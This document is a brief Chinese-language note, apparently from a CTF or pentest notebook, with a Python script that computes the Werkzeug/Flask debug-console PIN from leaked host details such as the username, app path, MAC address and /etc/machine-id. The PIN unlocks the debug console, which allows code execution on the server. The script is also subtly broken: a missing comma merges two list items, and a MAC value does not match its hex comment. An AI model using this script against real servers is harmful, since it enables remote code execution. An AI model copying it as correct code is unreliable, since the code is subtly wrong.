## Flask debug模式下的 PIN 码
- [Flask debug模式下的 PIN 码安全性](https://xz.aliyun.com/t/8092)


```py
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# 启动flask的用户名
    'flask.app',# 默认值
    'Flask',# 默认值 getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python2.7/dist-packages/flask/app.py' # getattr(mod, '__file__', None), # 通过报错显示出来
]

private_bits = [
    '52228526895',# str(uuid.getnode()),  /sys/class/net/ens33/address或者/sys/class/net/eth0/address 通过计算int("525400639452", 16)
    '75d03aa852be476cbe73544c93e98276'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

在ubuntu下验证成功：。

## Ref
- [Python Deserialization on Integrated AWS DDB Flask App](https://tradahacking.vn/python-deserialization-on-integrated-aws-ddb-flask-app-cd236d63f2da)
